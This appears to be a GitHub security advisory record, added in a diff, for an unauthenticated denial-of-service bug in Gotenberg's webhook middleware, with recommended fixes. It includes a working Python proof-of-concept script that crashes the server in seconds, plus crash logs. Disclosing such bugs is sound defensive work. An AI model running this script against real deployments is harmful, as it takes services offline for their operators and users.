@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-r33j-c622-r6qp",
+  "modified": "2026-05-07T01:20:11.393884Z",
+  "published": "2026-05-07T01:00:24Z",
+  "aliases": [
+    "CVE-2026-42594"
+  ],
+  "summary": "Gotenberg has an unauthenticated denial of service via echo.Context pool reuse in webhook async goroutine",
+  "details": "## Summary\n\nThe webhook middleware spawns a goroutine that holds a reference to the request's `echo.Context` after the synchronous handler returns `ErrAsyncProcess` and Echo recycles the context back to its `sync.Pool`. When a concurrent request claims the recycled context, `c.Reset()` clears the store. If the webhook goroutine reaches `hardTimeoutMiddleware` at that moment, an unchecked type assertion on a nil store entry panics outside any `recover()` scope, crashing the Gotenberg process. Any anonymous caller reaches the webhook path (default `webhook-deny-list` filters only the webhook destination, not the submitter). A single-source stress of ~24 webhook requests plus ~60 `GET /version` requests crashes the process in about two seconds.\n\n## Details\n\n`pkg/modules/webhook/middleware.go:338-382` starts the async goroutine and immediately returns `api.ErrAsyncProcess` to the caller:\n\n```go\nw.asyncCount.Add(1)\ngo func() {\n    defer cancel()\n    defer w.asyncCount.Add(-1)\n\n    err := next(c)                    // line 343\n    ...\n    sendOutputFile(sendOutputFileParams{ ctx: ctx, ... })\n}()\n\nreturn api.ErrAsyncProcess             // line 382\n```\n\n`pkg/modules/api/middlewares.go:356-361` sees the sentinel, responds with `204 No Content`, and lets Echo return `c` to the pool:\n\n```go\nif errors.Is(err, ErrAsyncProcess) {\n    return c.NoContent(http.StatusNoContent)\n}\n```\n\nEcho's router calls `c.Reset()` before serving the next request from the same goroutine pool slot, wiping `c.store`. When the webhook goroutine's `next(c)` enters `hardTimeoutMiddleware` at `pkg/modules/api/middlewares.go:396-398`, the handler dereferences the store before the new recover scope exists:\n\n```go\nreturn func(c echo.Context) error {\n    logger := c.Get(\"logger\").(*slog.Logger)   // line 398\n\n    ...\n    go func() {\n        defer func() { if r := recover(); r != nil { ... } }()   // recover is scoped here\n        errChan \u003c- next(c)\n    }()\n```\n\nIf a concurrent request has just acquired `c` from the pool, `c.Get(\"logger\")` returns `nil`, and `nil.(*slog.Logger)` panics at line 398. The panic is not inside any goroutine with a `recover()`, so the Go runtime terminates the process with exit code 2.\n\nNo `echo.Recover` middleware is registered (`pkg/modules/api/api.go:480-536`). `GOTRACEBACK` defaults propagate the panic to stderr and exit.\n\n## Proof of Concept\n\nReproduction on the stock Docker image with default configuration:\n\n```bash\ndocker run -d --name gotenberg-poc -p 3000:3000 \\\n    -e GOTRACEBACK=all gotenberg/gotenberg:8 gotenberg --log-level=error\n```\n\nSingle-process stress script (Alice sends both streams, no second actor):\n\n```python\nimport requests, subprocess, time, json, threading\n\nTARGET  = \"http://localhost:3000\"\nWEBHOOK = \"http://httpbin.org/post\"   # passes default webhook-deny-list\nSTOP    = threading.Event()\nhtml    = b\"\u003chtml\u003e\u003cbody\u003e\u003ch1\u003eQ\u003c/h1\u003e\u003c/body\u003e\u003c/html\u003e\"\n\ndef webhook_fire():\n    s = requests.Session()\n    while not STOP.is_set():\n        try:\n            s.post(\n                f\"{TARGET}/forms/chromium/convert/html\",\n                files={\"files\": (\"index.html\", html, \"text/html\")},\n                headers={\n                    \"Gotenberg-Webhook-Url\":       WEBHOOK,\n                    \"Gotenberg-Webhook-Error-Url\": WEBHOOK,\n                },\n                timeout=15,\n            )\n        except: pass\n\ndef noise_fire():\n    s = requests.Session()\n    while not STOP.is_set():\n        try: s.get(f\"{TARGET}/version\", timeout=2)\n        except: pass\n\nfor _ in range(24): threading.Thread(target=webhook_fire, daemon=True).start()\nfor _ in range(60): threading.Thread(target=noise_fire,   daemon=True).start()\n\nt0 = time.time()\nwhile time.time() - t0 \u003c 60:\n    time.sleep(1)\n    status = json.loads(subprocess.run(\n        [\"docker\", \"inspect\", \"gotenberg-poc\"],\n        capture_output=True, text=True, check=True).stdout)[0][\"State\"]\n    if status[\"Status\"] != \"running\":\n        print(f\"process crashed after {time.time()-t0:.1f}s, exit code {status['ExitCode']}\")\n        STOP.set()\n        break\n```\n\nObserved output:\n\n```\nprocess crashed after 2.2s, exit code 2\n```\n\nContainer stderr captured with `docker logs gotenberg-poc`:\n\n```\npanic: interface conversion: interface {} is nil, not *slog.Logger\ngoroutine 287020 [running]:\n    /home/pkg/modules/api/middlewares.go:398 +0x2e6\n    /home/pkg/modules/webhook/middleware.go:343 +0xec\ncreated by github.com/gotenberg/gotenberg/v8/pkg/modules/webhook.(*Webhook).Middlewares.webhookMiddleware.func1.func2.2\n    /home/pkg/modules/webhook/middleware.go:338 +0x1176\n```\n\n## Impact\n\nAny client that can reach the Gotenberg API crashes the process. Auto-restart policies (`--restart=always`, Kubernetes liveness probes, Compose defaults) let Gotenberg come back up, but each crash drops every in-flight conversion, abandons pending webhook deliveries, and resets internal state. Sustained attack traffic keeps the process in a restart loop, producing continuous unavailability. The webhook-deny-list blocks attacker-chosen webhook destinations inside private networks, but does not filter the submitter of the request, so an unauthenticated Internet attacker drives the crash with only the ability to reach port 3000.\n\n## Recommended Fix\n\nReplace the unchecked type assertion at `pkg/modules/api/middlewares.go:398` with a guarded lookup that handles the pool-reuse case:\n\n```go\nlogger, _ := c.Get(\"logger\").(*slog.Logger)\nif logger == nil {\n    return errors.New(\"context reused from pool before middleware chain populated it\")\n}\n```\n\nAlso add a `defer recover()` at the top of the webhook goroutine body at `pkg/modules/webhook/middleware.go:338` so any future panic downstream does not kill the process:\n\n```go\ngo func() {\n    defer func() {\n        if r := recover(); r != nil {\n            ctx.Log().Error(fmt.Sprintf(\"webhook goroutine panic: %v\", r))\n            handleError(fmt.Errorf(\"internal error: %v\", r))\n        }\n    }()\n    defer cancel()\n    defer w.asyncCount.Add(-1)\n    ...\n}()\n```\n\nA deeper fix detaches `echo.Context` from `api.Context` before the goroutine runs: extract every value the goroutine needs (output filename, logger, correlation fields) into plain variables or struct fields, then clear `ctx.echoCtx` so downstream code cannot reach the pooled context.\n\n---\n*Found by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/gotenberg/gotenberg/v8",
+        "purl": "pkg:golang/github.com/gotenberg/gotenberg/v8"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "8.32.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 8.31.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-r33j-c622-r6qp/GHSA-r33j-c622-r6qp.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gotenberg/gotenberg/security/advisories/GHSA-r33j-c622-r6qp"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gotenberg/gotenberg"
+    }
+  ]
+}
